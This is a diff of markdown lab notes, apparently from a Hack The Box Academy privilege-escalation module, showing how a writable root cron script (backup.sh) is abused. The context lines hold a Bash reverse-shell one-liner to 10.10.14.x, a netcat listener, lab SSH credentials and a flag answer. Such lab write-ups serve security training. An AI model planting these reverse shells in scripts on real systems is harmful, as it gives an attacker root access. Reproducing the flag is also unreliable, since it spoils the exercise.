@@ -1,7 +1,7 @@
 # Cron Job Abuse
 Look around the system for any writeable files or directories.
 
-```sh
+```shellsession
 $ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
 ```
 
@@ -9,7 +9,7 @@ $ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
 
 Let's run `pspy` and have a look. The `-pf` flag tells the tool to print commands and file system events and `-i 1000` tells it to scan procfs every 1000ms (or every second).
 
-```sh
+```shellsession
 $ ./pspy64 -pf -i 1000
 
 pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
@@ -65,7 +65,7 @@ From the above output, we can see that a cron job runs the `backup.sh` script lo
 
 Let's modify the script to add a Bash one-liner reverse shell.
 
-```sh
+```shellsession
 #!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
@@ -77,7 +77,7 @@ bash -i >& /dev/tcp/10.10.14.3/443 0>&1
 
 We modify the script, stand up a local `netcat` listener, and wait. Sure enough, within three minutes, we have a root shell!
 
-```sh
+```shellsession
 $ nc -lnvp 443
 
 listening on [any] 443 ...
@@ -98,14 +98,14 @@ NIX02
 SSH to 10.129.43.87 (ACADEMY-LPE-NIX02), with user `htb-student` and password `Academy_LLPE!`
 1. Connect to the target system and escalate privileges by abusing the misconfigured cron job. Submit the contents of the `flag.txt` file in the `/root/cron_abuse` directory. **Answer: 14347a2c977eb84508d3d50691a7ac4b**
    - Find writeable files → notice `backup.sh` is writeable:
-        ```sh
+        ```shellsession
         $ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
         /etc/cron.daily/backup
         /dmz-backups/backup.sh
         <SNIP>
         ```
    - Run pspy to view running processes → found out backup.sh is running as a cron job:
-        ```sh
+        ```shellsession
         $ ./pspy64 -pf -i 1000
         2026/06/14 06:02:01 CMD: UID=0     PID=2743   | /bin/bash /dmz-backups/backup.sh 
         2026/06/14 06:02:01 CMD: UID=0     PID=2742   | /bin/sh -c /dmz-backups/backup.sh 
@@ -122,7 +122,7 @@ SSH to 10.129.43.87 (ACADEMY-LPE-NIX02), with user `htb-student` and password `A
         ```
    - Modify `backup.sh` with a one liner reverse shell and gain the shell via our listener:
         At victim, modify the `backup.sh` to connect back to our host IP:
-        ```sh
+        ```shellsession
         $ cat /dmz-backups/backup.sh 
         #!/bin/bash
         SRCDIR="/var/www/html"
@@ -132,7 +132,7 @@ SSH to 10.129.43.87 (ACADEMY-LPE-NIX02), with user `htb-student` and password `A
         bash -i >& /dev/tcp/10.10.14.14/443 0>&1
         ```
         At host, start a listener:
-        ```sh
+        ```shellsession
         $ sudo nc -nlvp 443
         Listening on 0.0.0.0 443
         Connection received on 10.129.43.87 33432
